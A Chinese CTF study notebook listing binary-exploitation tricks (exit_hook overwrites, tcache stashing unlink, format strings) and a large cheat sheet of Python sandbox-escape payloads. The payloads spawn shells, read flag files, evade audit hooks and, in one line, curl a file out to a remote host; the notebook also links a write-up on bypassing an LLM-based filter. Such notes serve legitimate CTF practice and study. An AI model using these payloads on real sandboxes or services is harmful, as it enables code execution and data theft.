31. [exit_hook](https://www.cnblogs.com/pwnfeifei/p/15759130.html)的[利用](https://www.cnblogs.com/bhxdn/p/14222558.html)。其实没有exit hook，它是函数指针，故无法直接libc.sym找到，只能手动记录值。

```
在libc-2.23中
exit_hook = libc_base+0x5f0040+3848（64）
exit_hook = libc_base+0x5f0040+3856（32）

在libc-2.27中
exit_hook = libc_base+0x619060+3840（64）
exit_hook = libc_base+0x619060+3848（32）
```

上面给出的链接介绍了如何用rtld_lock_default_lock_recursive等函数指针来getshell。这道[题](https://4n0nym4u5.github.io/2023/02/12/LA_CTF_23/)又提供了另变种：因为先调用tld_lock_default_lock_recursive再调用rtld_lock_default_unlock_recursive，且两者都使用_rtld_local+2312作为rdi。所以可以将rtld_lock_default_lock_recursive的函数指针改为gets，手动输入/bin/sh；再将rtld_lock_default_unlock_recursive的函数指针改为system，即可getshell。

最近遇到一道[题](https://blog.csdn.net/tbsqigongzi/article/details/126312377)，任意地址写改exit_hook。这里面也是ubuntu18，64位libc-2.27，只不过偏移是0x81df60，用之前记录的0x619060+3840不行。两者应该是看情况使用。

只要知道libc版本和任意地址的写，就可以直接写这个指针，执行exit后就可以拿到shell了。（也不用非要执行exit函数，程序正常返回也可以执行到这里）

32. arm架构下的栈溢出。例题:[jarvisoj_typo](https://www.cnblogs.com/LynneHuan/p/16104052.html)。在ARM架构中，PC寄存器相当于rip，保存的是当前正在取指的指令的地址，因此栈溢出控制[pc寄存器](https://blog.51cto.com/u_13682052/2977378)就能控制程序流程。
33. [tcache Stashing Unlnk](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-stashing-unlink-attack)。利用Smallbin的相关分配机制进行攻击，需要可控一个chunk或者构造一个fake chunk的bk，效果为在任意地址上写一个 libc 地址 (类似 unsorted bin attack)。例题:[[2020 新春红包题]3](https://www.anquanke.com/post/id/198173#h3-6)
34. pwntools可以设置context.buffer_size，默认为0x1000，可以改大一点，避免利用格式化字符串漏洞，printf参数为%34565c%6$p这种情况的时候，满屏的空白字符，影响下一次利用。还可以利用for循环结合sleep来确保每一次printf写数据的时候，把所有输出的字符都完全接收，避免得到非预期结果。打远程的时候，还需要使用sleep函数，给缓冲区刷新的时间。
35. c++(arm) ret2libc入门。例题:[redact](https://jiravvit.github.io/230216-lactf2023-redact/)。这里简述一些要点：

- 当我们在c++里写下面的代码时：

```c++
#include <iostream>
int main() {
    std::cout << "Hello World!";
}
```
编译后实际调用的函数是`_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc`，即函数修饰名。泄露地址时要找修饰名的地址调用，可以用pwntols的[ROP](https://docs.pwntools.com/en/stable/rop/rop.html#manual-rop)。
- size_t代表unsigned，和int混用时容易出现经典的栈溢出（利用一个小size_t减一个大的size_t会得到一个很大的整数而不是负数的特点）。
- std::string在内存中存储的结构：
```
+00h: <Data Pointer> 
+08h: <Data Size>
+10h: <Data>  
+18h: <Data>
```
当Data Size超过0x10时, Data Pointer会存在堆上。

36. Full RELRO，NX+PIE格式化字符串调用system('/bin/sh')。例题:[rut-roh-relro](https://jiravvit.github.io/230215-lactf2023-rut-roh-relro/),视频[wp](https://www.youtube.com/watch?v=K5sTGQPs04M)。rdi是一块可写的空间，泄露libc基地址后加上调试得到的偏移即可尝试写入，例如格式化字符串漏洞调用system。写栈上返回地址也是同理。不是往反编译出来的地址上写，而是泄露栈地址后调试找到偏移然后格式化字符串写。注意libc，stack，pie需要分别泄露地址，都需要靠动调找泄露出来的偏移。甚至于，同一个函数，不同调用的偏移都不是一致的。如果单纯PIE+NX，可以用格式化字符串泄露一个地址后算出基址，加上plt和got表的偏移即可算出system等函数的正确plt/got，改got表即可。
37. 利用risc-v虚拟机任意地址读写漏洞执行rop链。例题:[CS2100](../../CTF/HackTM%20CTF/Pwn/CS2100.md)
38. 在python2中，input()函数等同于eval(raw_input())，意味着它会读取合法的python 表达式并执行，那么输入一个shell语句就能getshell了，例如`"__import__('os').system('cat flag.txt')"`。例题:[Balloons](https://github.com/ZorzalG/the-big-MHSCTF2023-writeups/blob/main/Balloons.md)
39. [Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻。
- `[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])`
> 利用\*符号将字典值转为列表，从而可使用\[\]取值+利用system函数和`__doc__`里的sh字符串getshell。例题:[Virus Attack](https://github.com/daffainfo/ctf-writeup/tree/main/2023/ByteBanditsCTF%202023/Virus%20Attack)。类似的题目还有里面提到的[Albatross](https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross)，不过这道题多了个unicode哥特字符也能执行函数的考点：

```python
𝔭𝔯𝔦𝔫𝔱("hello!")
#hello!
```
print函数可正常使用。提供一个简单的普通字母转哥特字母脚本。
```py
import string,sys
fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
real_alphabet = string.ascii_lowercase
trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))
code = sys.argv[1]
converted_code = code.translate(trans)
print(converted_code)
```
- `("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`
  - 任意文件读取。来源:[Pycjail](../../CTF/LA%20CTF/Misc/Pycjail.md)（任意文件读取/RCE）。知识点：
    - LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode。
    - IMPORT_FROM本质上还是LOAD_ATTR，只不过多了一层伪装。可以手工在使用LOAD_ATTR的地方将其改为IMPORT_FROM也不会有问题。
    - 在python 的bytecode中，两种调用函数的方式分别为LOAD_METHOD+CALL_METHOD和LOAD_ATTR+CALL_FUNCTION.
- `().__class__.__bases__[0].__subclasses__()[124].get_data('.','flag.txt')`.这种是上个的变种，两者都可以在jail环境无builtins时使用
- 假如环境带有gmpy2，注意gmpy2.__builtins__是含有eval的，因此可以构造任意命令。在builtins里取函数和构造命令还可以通过拼接的形式，如：

```python
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```
- print相关(无需eval)
  - `print.__self__.__import__("os").system("cmd")`。绕过滤版本：`print.__self__.getattr(print.__self__.getattr(print.__self__, print.__self__.chr(95) + print.__self__.chr(95) + print.__self__.chr(105) + print.__self__.chr(109) + print.__self__.chr(112) + print.__self__.chr(111) + print.__self__.chr(114) + print.__self__.chr(116) + print.__self__.chr(95) + print.__self__.chr(95))(print.__self__.chr(111) + print.__self__.chr(115)), print.__self__.chr(115) + print.__self__.chr(121) + print.__self__.chr(115) + print.__self__.chr(116) + print.__self__.chr(101) + print.__self__.chr(109))("cmd")`
  - 尝试读函数源码
  ```py
  print(<func>.__code__) #获取文件名，func为文件内的函数名
  print(<fund>.__code__.co_names) #获取函数内调用的函数
  print(<func>.__code__.co_code) #函数的字节码
  print(<func>.__code__.co_consts) #函数内直接定义的常量
  print(<func>.__code__.co_varnames) #函数内定义的变量
  #https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/pygulag ，内含字节码反编译脚本
  ```
  - `print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])`
  - `print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))`
  - `print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))`
  - `print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["filename"]),print.__self__.credits()`,打印文件内容
  - `print(globals.__self__.__import__("os").system("cmd"))`
  - `print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cmd').read())`
  - `print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cmd'))`
  - `print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))`
  - `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
  - `print(().__class__.__mro__[1].__subclasses__()[84]().load_module('o'+'s').__dict__['sy'+'stem']('cmd'))`
  - `print([x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cmd'))`
  - `print(print.__self__.__loader__().load_module('o' + 's').__dict__['pop'+'en']('cmd').read())`
  - `print.__self__.__dict__["__import__"]("os").system("cmd")`
- 关于`eval(payload)`中payload的控制
  - 不使用26个字母中的前13个字母（使用10进制ascii绕过）：`exec("pr\x69nt(op\x65n('\x66'+\x63\x68r(108)+'\x61\x67.txt').r\x65\x61\x64())")`
  - 不使用26个字母中的后13个字母（使用8进制）：`exec("\160\162i\156\164(\157\160e\156('flag.\164\170\164').\162ead())")`,`exec("\160\162\151\156\164\050\157\160\145\156\050\047\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051\051")`，`\145\166\141\154\50\151\156\160\165\164\50\51\51`(`eval(input)`)
  - 不使用任何数字或括号：`[[help['cat flag.txt'] for help.__class__.__getitem__ in [help['os'].system]] for help.__class__.__getitem__ in [__import__]]`(执行命令)，`[f"{help}" for help.__class__.__str__ in [breakpoint]]`(开启pdb)
  - 使用斜体:`𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())`,`𝘦𝘹𝘦𝘤("𝘢=𝘤𝘩𝘳;𝘣=𝘰𝘳𝘥;𝘤=𝘣('൬');𝘥=𝘢(𝘤-𝘣('೸'));𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(𝘢(𝘤-𝘣('ആ'))+𝘢(𝘤-𝘣('ഀ'))+𝘢(𝘤-𝘣('ഋ'))+𝘢(𝘤-𝘣('അ'))+'.'+𝘥+𝘢(𝘤-𝘣('೴'))+𝘥).𝘳𝘦𝘢𝘥())")`
  - 不使用`__`:`()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.','flag.txt')`(第二个`＿`是unicode里面的下划线，python自动标准化成`_`)
  - 使用特殊字体：`ｂｒｅａｋｐｏｉｎｔ()`（开启pdb）
- 当空格被过滤时，可以用tab键代替：`import    os`
- `[module for module in ().__class__.__bases__[0].__subclasses__() if 'Import' in module.__name__][0].load_module('os').system('cmd')`,通过`class '_frozen_importlib.BuiltinImporter'>`模块导入os执行命令
- `[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('cmd')`
- `[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cmd")`
- `().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")`
- `().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cmd")`
- 奇怪字体系列：
  - `ｅｘｅｃ('ｐｒｉｎｔ(ｏｐｅｎ(' + ｃｈｒ(34) + ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116)+ｃｈｒ(120)+ｃｈｒ(116) + ｃｈｒ(34) + ')' + ｃｈｒ(46)+'ｒｅａｄ())')`
  - `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`
  - `𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())`
  - `𝘦𝘹𝘦𝘤(𝘪𝘯𝘱𝘶𝘵())`
- 类似[fast-forward](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/misc/fast-forward),[wp](https://ebonyx.notion.site/misc-fast-forward-v2-40c53a6a56ff4ad19523524065b2c9c3)的pyjial： 限制可使用的操作码和字节码，以及标识符的长度（the opcodes the bytecode is allowed to contain and the lengths of the identifiers, or “names” that we can use）。例如，只能使用5个字符长度以下的函数（print之类的，breakpoint就不行。不过字符串不限制长度）。以下是此类型题可用payload：
  - `bt=vars(vars(type.mro(type)[1])['__getattribute__'](all,'__self__'));imp=bt['__import__'];bt['print'](bt['getattr'](bt['getattr'](vars(imp('inspect'))['currentframe'](),'f_back'),'f_globals')['flag'])`
    - 用`object.__getattribute__`替代getattr。此题flag为一个全局变量，在调用输入代码的main函数中可访问。导入inspect模块并使用`inspect.currentframe().f_back`获取父栈帧即可从f_globals中获取。
  - `(lambda: print((1).__class__.__base__.__subclasses__()[134].__init__.__globals__['system']('/bin/sh')))()`
    - lambda函数可以“隐藏”函数名和参数名。来源：https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/misc#fast-forward-26-solves
  - `E=type('',(),{'__eq__':lambda s,o:o})();x=vars(str)==E;x["count"]=lambda s,o:s` .详情见： https://github.com/python/cpython/issues/88004
  ```py
  #去除注释并用分号连接后使用
  self = vars(type(chr))['__self__']
  vrs = vars(type(self))['__get__'](self, chr)
  open = vars(vrs)['open']
  p = vars(vrs)['print']
  gat = vars(vrs)['getattr']
  fp = open('flag.txt', 'r')
  flag = gat(fp, 'read')()
  p(flag)

  #或

  # get vars() of <class 'type'>:
  tvs = vars(type(type(1)))
  # get __base__ attribute:
  base = tvs['__base__']
  # call base.__get__(type(1)) to get <class 'object'>:
  ot = vars(type(base))['__get__'](base, type(1))
  # pull getattr from <class 'object'>:
  gat = vars(ot)['__getattribute__']
  # get list of all classes:
  cs = gat(ot, '__subclasses__')()
  # find BuiltinImporter class:
  ldr = [x for x in cs if 'BuiltinImporter' in str(x)][0]
  # get load_module function:
  ldm = gat(gat(ldr, 'load_module'), '__func__')
  # load os and sys modules:
  os = ldm(ldr, 'os')
  sys = ldm(ldr, 'sys')
  # os.open(flag.txt):
  fp = gat(os, 'open')('flag.txt', gat(os, 'O_RDONLY'))
  # os.read(fp):
  flag = gat(os, 'read')(fp, 100)
  # sys.stdout.write(flag.decode()):
  gat(gat(sys, 'stdout'), 'write')(gat(flag, 'decode')())
  ```
  - `x = type.mro(type); x = x[1]; ga = vars(x)['__getattribute__']; sc = ga(x, '__subclasses__')(); pr = sc[136]('fleg',''); vars(pr)['_Printer__filenames'] = ['flag.txt']; pr()`,需要爆破`_Printer`的索引
  - `o=type(()).mro()[1];g=vars(o)['__getattribute__'];b=g(chr,'__self__');i=g(b,'__import__');o=i('os');s=g(o,'system');s("python -c \"print(open('flag.txt').read())\"")`
  ```py
  vars(vars()["license"])["_Printer__lines"]=None
  print(vars(vars()["license"])["_Printer__lines"])
  vars(vars()["license"])["_Printer__filenames"]=["flag.txt"]
  print(vars()["license"]())
  ```
  - `exit(vars(vars(type)["__subclasses__"](type.mro(type({}))[1])[99])['get_data'](vars(type)["__subclasses__"](type.mro(type({}))[1])[99]('flag.txt','./'),'flag.txt'))`
  - `x = vars(); a = [ x[k] for k in x.keys() ][:-1];aa = a[76];ga = vars(aa)['__getattribute__'];scs = ga(ga(aa,'__base__'),'__subclasses__')(); o = ga(scs[84],'load_module')('os'); vars(o)['system']('/bin/bash')`
  - `[1 for _ in '']+[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0]['system']('/bin/sh')`
  - `(lambda:__loader__.load_module("os").system("/bin/sh"))()`
  - `(lambda:().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["__import__"]("os").system("/bin/sh"))()`
  - `__build_class__.__self__.__import__("os").system("sh")`
- [rattler_read](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/rattler_read)
    ```py
    """
    g=(print(g.gi_frame.f_back.f_back.f_builtins['open']('/flag.txt').read())for x in(0,))
    for x in g:0
    """.strip()
    .replace("\n", "\r")
    ```
    - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
    - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
    - https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pyjail/rattler-read/writeup : `class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)`
    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
- [Censorship](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship)：环境包含flag变量需要泄露+绕过滤
    - 覆盖程序函数从而取消过滤。如题目用ascii(input)来保证输入只能是ascii。我们可以让`ascii = lambda x: x`，然后就能用非ascii字符绕过
    - https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/misc/censorship ：题目中存在包含flag的变量`_`，直接`locals()[_]`然后keyerror
      - 类似的还有`{}[_]`,`vars()[_],globals()[_]`.要求题目会返回exception的内容
    - `vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]])[(*vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]()`:开启pdb
    - `vars(vars()['__bu' + chr(105) + chr(108) + chr(116) + chr(105) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()[chr(102) + chr(108) + chr(97) + chr(103)])`
    - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship ：`vars(globals()["__buil" + chr(116) + "ins__"])["prin" + chr(116)](_)`。vars+globals构造字典取print
    - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/ ：`vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())`
- [Censorship Lite](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite)：类似Censorship但更多过滤
    - intend解法可以getshell，但是有点复杂
    - `any="".__mod__;print(flag)`:覆盖any函数后过滤失效，直接print. https://hackmd.io/@yqroo/Censorship-series
    - `vars(vars()['__bu' + chr(ord('A')^ord('(')) + chr(ord('E')^ord(')')) + chr(ord('H') ^ ord('<')) + chr(ord('A')^ord('(')) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()['f' + chr(ord('E')^ord(')')) + 'ag'])`
    - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/#censorship-lite : `vars(vars()[[*vars()][ord('A')-ord('B')]])[[*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]]()`,开启pdb
    - https://github.com/aparker314159/ctf-writeups/blob/main/AmateursCTF2023/censorships.md ：利用[tadpole operator](https://devblogs.microsoft.com/oldnewthing/20150525-00/?p=45044)(c++里面一个冷门语法，python里也有，作用是返回加上/减去1后的值，但不像`++,--`那样改变原变量的值。`-~y`等同于y+1,`~-y`等同于y-1)
- [Censorship Lite++](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite%2B%2B):泄露flag变量，但是过滤部分字符和符号以及全部数字
    - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship-lite-1 :过滤掉部分字符后可以利用python对字符串的[转换](https://stackoverflow.com/questions/961632/convert-integer-to-string-in-python)从函数等地方取。
- [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
- [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
- [My Third Calculator](https://ireland.re/posts/TheFewChosen_2023/#my-third-calculator):`__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag ip;exit" #%s'}))`.antigravity是python里一个彩蛋模块，导入它会打开[xkcd](https://xkcd.com/353/)。通过将环境变量browser改为shell命令，就能在导入时执行shell命令而不是打开网页
- `list(open("flag.txt"))`/`str([*open('flag.txt')])`/`open('flag.txt').__next__()`:没有read函数的情况下读取文件。需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的
- [PyPlugins](https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#pyplugins): python是能接受zip file当作input的(参考zipapp)，里面的运作原理和一般zip解压缩很像，就是找zip的end of central directory之类的。另一方面CPython还有个pyc档案包含了一些header和code object，而code object上又会有co_consts的存在。所以如果你有个Python里面有个很长的byte literal包含了一个zip，它编译成pyc之后会直接在里面展开，而此时去执行它的时候CPython反而是会因为那个zip signature而把它误认成zip来执行。可利用此绕过非常严格的opcodes限制。`runpy.run_path(py_compile.compile(path))`
```py
#生成path指向的文件内容
import tempfile
import zipfile
import base64
def create_zip_payload() -> bytes:
    file_name = "__main__.py"
    file_content = b'import os;os.system("/bin/sh")'
    with tempfile.TemporaryFile(suffix=".zip") as f:
        with zipfile.ZipFile(f, "w") as z:
            z.writestr(file_name, file_content)
        f.seek(0)
        return f.read()
temp=f"pwn={create_zip_payload()!r}"
print(base64.b64encode(temp.encode()))
```
- [obligatory pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/obligatory%20pyjail)
  - 禁止除exec或compile外的[audit events](https://docs.python.org/3/library/audit_events.html)。`__import__('os')`和`__loader__.load_module`不会触发import audit event；`_posixsubprocess.fork_exec`可以在最底层执行exec，不会被audit event捕捉到
  - `__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)`
  - `__import__("_posixsubprocess").fork_exec(['cat', 'flag.txt'], (b'/bin/cat',), True, (7,), None, None, -1, -1, __import__("os").pipe()[0], 5, -1, -1, __import__("os").pipe()[0], 7, True, False, None, None, None, -1, None)+print(__import__("os").read(4, 1000).decode())`
  - `[lm:=().__class__.__base__.__subclasses__()[104].load_module,p:=__import__("os").pipe,_ps:=lm("_posixsubprocess"),_ps.fork_exec([b"/bin/cat", b"flag.txt"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(p()), False, False, None, None, None, -1, None)]`
- [wow it's another pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail)
  - 有关RestrictedPython的漏洞。可以利用format访问用下划线开头的属性（这类属性正常情况下是被保护的，无法直接访问）
- [Just Another Pickle Jail](https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/misc/just-another-pickle-jail)
  - 其他解：
  ```py
  mgk = GLOBAL('', 'mgk')
  up = GLOBAL('', 'up')
  __main__ = GLOBAL('', '__main__')
  __getattribute__ = GLOBAL('', '__getattribute__')
  __init__ = GLOBAL('', '__init__')
  __builtins__ = GLOBAL('', '__builtins__')
  BUILD(up, None, {'banned': [], '__import__': __init__})
  BUILD(mgk, None, {'nested': up})
  BUILD(__main__, None, {'__main__': __builtins__})
  BUILD(up, None, {'__import__': __getattribute__})
  builtins_get = GLOBAL('', 'get')
  BUILD(up, None, {'__import__': __init__})
  BUILD(up, None, {'persistent_load': builtins_get})
  exec = PERSID('exec')
  BUILD(up, None, {'persistent_load': exec})
  PERSID('sys.modules["os"].system("sh")')
  ```
  ```py
  b'''c\n__main__\n\x94c\n__builtins__\n\x94b0c\n__getattribute__\n\x940c\nmgk\n\x940c\nup\n\x940h\3N(S"banned"\n]S"__import__"\nc\ntuple\nS"nested"\nh\3d\x86b0h\0N(S"__main__"\nh\1d\x86b0h\3N(S"__import__"\nh\2d\x86b0h\4(S"persistent_load"\nc\n__getitem__\ndb(S"persistent_load"\nPexec\ndb0Pnext(x for x in object.__subclasses__() if 'BuiltinImporter' in str(x)).load_module("os").system("sh")\n.'''
  ```
  ```py
  import sys
  sys.path.insert(0, "./Pickora")
  from pickora import Compiler
  import pickletools
  def unary(result_name, fn_name, arg_name):
      return f"""__builtins__['next'] = {fn_name}
  up._buffers = {arg_name}
  {result_name} = NEXT_BUFFER()
  """
  pk = Compiler().compile(
      f"""
  from x import Unpickler, __main__, __builtins__, up
  BUILD(__main__,__builtins__,None)
  from x import getattr, print, vars, dir, object, type, dict, list
  {unary('val', 'vars', 'dict')}
  BUILD(__main__,val,None)
  from x import values as dictvalues
  {unary('val', 'vars', 'list')}
  BUILD(__main__,val,None)
  from x import pop as listpop
  {unary('val', 'vars', 'list')}
  BUILD(__main__,val,None)
  from x import reverse as listreverse
  {unary('bl', 'dictvalues', '__builtins__')}
  {unary('bl', 'list', 'bl')}
  {unary('_', 'listreverse', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  {unary('val', 'listpop', 'bl')}
  s = 'object.mgk.nested.__import__("os").system("sh")'
  {unary('val', 'val', 's')}
  """
  )
  ```
- 进入python的help()界面后，可以随便输入一个模块（如os）然后输入`:e [filename]`读取文件(默认使用less命令展示文档)。有些时候远程机器开启了socat，这时help函数后在控制台打`!sh`即可getshell。参考 https://zhuanlan.zhihu.com/p/578986988 。help函数还可以用来泄露变量，如进入help函数后使用`__main__`
- [PyMagic](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Misc/PyMagic)：禁`()'"0123456789 `字符，eval环境无`__builtins__`，但有一个空类
  - 一些有助于构造payload的链接：
    - https://codegolf.stackexchange.com/questions/264291/how-turing-complete-is-your-language
    - https://sopython.com/wiki/Riddles
    - https://github.com/b01lers/b01lers-ctf-2021/tree/main/misc/noparensjail ：覆盖`<`号为system
  - 其他wp： https://github.com/SuperStormer/writeups/tree/master/tcp1pctf_2023/misc/pymagic
- [vampire](https://github.com/SuperStormer/writeups/tree/master/tcp1pctf_2023/misc/vampire)
  - 过滤数字和一些特殊字符。eval环境下有re模块，所以利用re实现rce
  - 官方wp： https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Misc/vampire
- [Python Jail](https://crusom.dev/posts/blue_hens_ctf_2023#challenge-python-jail)
  - 利用波浪线和减号获取任意数字： https://esolangs.org/wiki/Symbolic_Python
  - python内部有个`__doc__`属性，可以由此获取任意字符
- [Avatar](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/misc/Avatar)
  - 利用f string(`f'{}'`)构造字符并实现双eval RCE。`f"{97:c}"`输出为a
  - 其他做法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#avatar
- eval里不能用=号定义变量或给变量赋值，但是用海象运算符`:=`可以
- [least ELOistic fish](https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/misc/least%20ELOistic%20fish)
  - 利用多重getattr套娃和bytearray绕过过滤
  - 这题本身是python stockfish（国际象棋分析库）的使用，因为输入未被过滤，可以直接跳过当前输入，让stockfish自己和自己下棋
- [LLM Sanitizer](https://1-day.medium.com/llm-sanitizer-real-world-ctf-2024-walkthrough-233dbdb0b90f)
  - 绕语言模型过滤。其他解法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#llm-sanitizer
- [Diligent Auditor](https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/)
  - 在只能使用import导入一个名称不含下划线及`.`模块且大部分builtins被删除，添加audithook的情况下实现RCE/读文件
  - FileFinder内部的`_path_cache`缓存着文件夹下的所有文件名称，意味着即使不知道flag完整的文件名（只知道名称包含flag），也能通过`_path_cache`找到完整的文件名并读取
  - 使用readline类读取文件。open会被audit hook监视，但用readline读文件则不会触发audit hook
